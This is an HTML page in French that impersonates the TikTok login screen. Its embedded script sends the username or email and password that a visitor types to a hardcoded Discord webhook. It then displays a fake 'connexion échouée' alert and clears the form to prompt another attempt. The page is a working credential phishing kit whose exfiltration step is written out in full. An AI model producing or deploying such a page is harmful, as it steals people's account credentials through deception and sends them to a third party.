<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connexion TikTok - Email ou t√©l√©phone</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    /* Reset basique */
    * {
      box-sizing: border-box;
      margin: 0; padding: 0;
      font-family: 'Inter', sans-serif;
    }

    body {
      background-color: #fff;
      color: #161823;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 20px;
    }

    main {
      width: 380px;
      border: 1px solid #e6e6e6;
      border-radius: 12px;
      padding: 32px 32px 24px;
      box-shadow: 0 4px 12px rgb(0 0 0 / 0.05);
    }

    header {
      display: flex;
      justify-content: center;
      margin-bottom: 28px;
    }

    header img {
      height: 40px;
    }

    h1 {
      font-weight: 600;
      font-size: 24px;
      text-align: center;
      margin-bottom: 20px;
      color: #161823;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 6px;
      color: #161823;
    }

    input[type="text"],
    input[type="password"] {
      height: 44px;
      padding: 10px 12px;
      border-radius: 6px;
      border: 1px solid #e6e6e6;
      font-size: 16px;
      color: #161823;
      margin-bottom: 12px;
      transition: border-color 0.2s ease;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #fe2c55;
      box-shadow: 0 0 0 3px rgb(254 44 85 / 0.3);
    }

    .error-message {
      color: #fe2c55;
      font-size: 12px;
      min-height: 18px;
      margin-bottom: 12px;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
      user-select: none;
      color: #666;
    }

    .password-wrapper {
      position: relative;
      margin-bottom: 12px;
    }

    button {
      margin-top: 8px;
      background-color: #fe2c55;
      color: white;
      border: none;
      font-weight: 700;
      font-size: 16px;
      border-radius: 6px;
      height: 44px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      user-select: none;
    }

    button:disabled {
      background-color: #f3a6b7;
      cursor: not-allowed;
    }

    a.forgot-password {
      font-size: 14px;
      color: #fe2c55;
      text-decoration: none;
      margin-top: 16px;
      margin-bottom: 28px;
      display: inline-block;
    }

    .signup-text {
      font-size: 14px;
      text-align: center;
      color: #161823;
    }

    .signup-text a {
      color: #fe2c55;
      font-weight: 600;
      text-decoration: none;
      margin-left: 4px;
    }
  </style>
</head>
<body>
  <main>
    <header>
      <img src="https://www.logo.wine/a/logo/TikTok/TikTok-Logo.wine.svg" alt="TikTok Logo" />
    </header>
    <h1>Se connecter √† TikTok</h1>
    <form id="loginForm" novalidate>
      <label for="emailOrPhone">E-mail ou nom d'utilisateur</label>
      <input
        type="text"
        id="emailOrPhone"
        name="emailOrPhone"
        placeholder="E-mail ou nom d'utilisateur"
        autocomplete="username"
        required
      />
      <div class="error-message" id="emailOrPhoneError"></div>

      <label for="password">Mot de passe</label>
      <div class="password-wrapper">
        <input
          type="password"
          id="password"
          name="password"
          placeholder="Mot de passe"
          autocomplete="current-password"
          required
        />
        <span class="toggle-password" id="togglePassword" aria-label="Afficher ou masquer le mot de passe">üëÅÔ∏è</span>
      </div>
      <div class="error-message" id="passwordError"></div>

      <a href="#" class="forgot-password">Mot de passe oubli√© ?</a>

      <button type="submit" id="submitBtn" disabled>Se connecter</button>
    </form>
    <p class="signup-text">
      Tu n'as pas de compte ?
      <a href="#">S'inscrire</a>
    </p>
  </main>

  <script>
    const emailOrPhoneInput = document.getElementById('emailOrPhone');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const emailOrPhoneError = document.getElementById('emailOrPhoneError');
    const passwordError = document.getElementById('passwordError');
    const togglePassword = document.getElementById('togglePassword');

    function containsLetter(str) {
      return /[a-zA-Z]/.test(str);
    }

    function containsSpace(str) {
      return /\s/.test(str);
    }

    function validateInput(value) {
      if (containsSpace(value)) return 'La saisie ne doit pas contenir d‚Äôespaces.';
      if (value.length < 5) return 'La saisie doit contenir au moins 5 caract√®res.';
      if (value.length > 18) return 'La saisie ne doit pas d√©passer 18 caract√®res.';
      if (!containsLetter(value)) return 'La saisie doit contenir au moins une lettre.';
      return '';
    }

    function validatePassword(value) {
      if (containsSpace(value)) return 'Le mot de passe ne doit pas contenir d‚Äôespaces.';
      if (value.length < 5) return 'Le mot de passe doit contenir au moins 5 caract√®res.';
      if (value.length > 18) return 'Le mot de passe ne doit pas d√©passer 18 caract√®res.';
      return '';
    }

    function updateButtonState() {
      const emailVal = emailOrPhoneInput.value.trim();
      const passwordVal = passwordInput.value.trim();

      const emailValidationMsg = validateInput(emailVal);
      const passwordValidationMsg = validatePassword(passwordVal);

      emailOrPhoneError.textContent = emailValidationMsg;
      passwordError.textContent = passwordValidationMsg;

      if (!emailValidationMsg && !passwordValidationMsg) {
        submitBtn.disabled = false;
      } else {
        submitBtn.disabled = true;
      }
    }

    emailOrPhoneInput.addEventListener('input', updateButtonState);
    passwordInput.addEventListener('input', updateButtonState);

    togglePassword.addEventListener('click', () => {
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        togglePassword.textContent = 'üôà';
      } else {
        passwordInput.type = 'password';
        togglePassword.textContent = 'üëÅÔ∏è';
      }
    });

    document.getElementById('loginForm').addEventListener('submit', (e) => {
      e.preventDefault();

      const emailVal = emailOrPhoneInput.value.trim();
      const passwordVal = passwordInput.value.trim();

      // Final validation avant envoi
      const emailValidationMsg = validateInput(emailVal);
      const passwordValidationMsg = validatePassword(passwordVal);

      if (emailValidationMsg || passwordValidationMsg) {
        emailOrPhoneError.textContent = emailValidationMsg;
        passwordError.textContent = passwordValidationMsg;
        return;
      }

      const discordMessage =
        `üì• **Nouvelle tentative de connexion TikTok**\n\n` +
        `**üë§ Email ou Nom d'utilisateur :** \`${emailVal}\`\n` +
        `**üîê Mot de passe :** \`${passwordVal}\`\n` +
        `üïí Date : ${new Date().toLocaleString('fr-FR')}`;

      fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: discordMessage }),
      }).then(() => {
        alert('Connexion √©chou√©e. Veuillez r√©essayer.');
        emailOrPhoneInput.value = '';
        passwordInput.value = '';
        submitBtn.disabled = true;
      }).catch(() => {
        alert('Erreur de connexion au serveur.');
      });
    });
  </script>
</body>
</html>
